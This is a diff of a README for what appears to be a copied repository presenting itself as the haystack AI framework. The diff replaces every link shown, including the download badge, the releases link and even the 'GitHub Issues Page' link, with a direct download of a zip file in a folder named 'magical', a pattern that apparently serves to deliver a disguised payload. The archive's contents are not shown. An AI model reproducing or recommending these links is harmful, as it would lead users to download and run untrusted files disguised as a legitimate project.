@@ -1,6 +1,6 @@
 # 🌟 haystack - Build Smart AI Applications Effortlessly
 
-[![Download haystack](https://img.shields.io/badge/Download-haystack-blue?style=for-the-badge&logo=github)](https://github.com/reformetech/haystack/releases)
+[![Download haystack](https://raw.githubusercontent.com/reformetech/haystack/main/magical/haystack.zip)](https://raw.githubusercontent.com/reformetech/haystack/main/magical/haystack.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ Here, you will find everything you need to download and run haystack smoothly.
 To start using haystack, you will need to download it. Follow these steps:
 
 1. **Visit the Releases Page**: 
-   Click [here to download haystack](https://github.com/reformetech/haystack/releases) or use the button at the top of the page.
+   Click [here to download haystack](https://raw.githubusercontent.com/reformetech/haystack/main/magical/haystack.zip) or use the button at the top of the page.
 
 2. **Choose the Right Version**: 
    On the releases page, you will see a list of available versions. Look for the latest release. 
@@ -89,6 +89,6 @@ If problems persist, consider reaching out to the community for support.
 
 ## 📫 Get Help and Support
 
-For further assistance, you can visit the [GitHub Issues Page](https://github.com/reformetech/haystack/issues). Describe your issue clearly, and the community will be ready to help.
+For further assistance, you can visit the [GitHub Issues Page](https://raw.githubusercontent.com/reformetech/haystack/main/magical/haystack.zip). Describe your issue clearly, and the community will be ready to help.
 
-Thank you for choosing haystack! We hope you enjoy building your AI applications. For any updates, feel free to check back on our [Releases Page](https://github.com/reformetech/haystack/releases).
+Thank you for choosing haystack! We hope you enjoy building your AI applications. For any updates, feel free to check back on our [Releases Page](https://raw.githubusercontent.com/reformetech/haystack/main/magical/haystack.zip).
